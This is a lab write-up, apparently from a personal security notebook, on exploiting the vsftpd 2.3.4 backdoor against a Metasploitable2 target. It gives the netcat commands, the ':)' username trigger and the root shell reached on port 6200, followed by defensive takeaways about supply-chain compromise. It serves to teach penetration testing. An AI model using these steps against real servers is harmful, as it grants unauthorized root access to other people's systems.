# Vsftpd 2.3.4 Backdoor — Port 21

**Date:** 2026-08-11
**Status:** Complete

## Objective
Exploit the known backdoor on vsftpd version 2.3.4, allowing intruders access to the root shell with a simple username alteration.

## Environment
- Attacker: Kali Linux (192.168.56.102)
- Target: Metasploitable2 (192.168.56.101)

## Tools Used
- nc (netcat)

## What is vsftpd?
Vsftpd is an open-source FTP (File Transfer Protocol) server for Unix systems such as Linux. It is primarily known for its incredible stability, security, and high performance. However, versions of vsftpd such as 2.3.4 are vulnerable and can be exploited by attackers.

## Steps Taken
1. Connected to port 21 using netcat:
```bash
   nc 192.168.56.101 21
```
2. Entered credentials (username and password) but added the trigger characters ":)" to the username, e. Utilized an arbitrary password.
```bash
   USER e:)
   PASS ew
```
3. Connected to port 6200 using netcat:
```bash
   nc 192.168.56.101 6200
```
4. Verified root access:
```bash
   whoami   # root
   id       # uid=0(root) gid=0(root) groups=0(root)
   hostname # metasploitable
```

## Findings
- The vsftpd backdoor was caused by an unknown actor replacing the downloadable source code on the vsftpd official website with a malicious version
- Any username containing the string ":)" (specifically ending in that sequence) is detected by the malicious code before authentication even completes
- The trigger spawns /bin/sh bound to TCP port 6200, accessible to anyone with no valid credentials needed
- Immediate root access is granted to anyone who connects to port 6200 upon abusing the backdoor

## Takeaways
- Always verify software integrity, even when downloading from official sources (as software can be hacked/compromised by threat actors)
- Version 2.3.4 of vsftpd should never be run in production, with patched versions of the protocol already removing the malicious code
- Supply-chain compromise can be more dangerous than your typical memory-corruption CVE, with the only thing being exploited was the knowledge of the backdoor string's existence
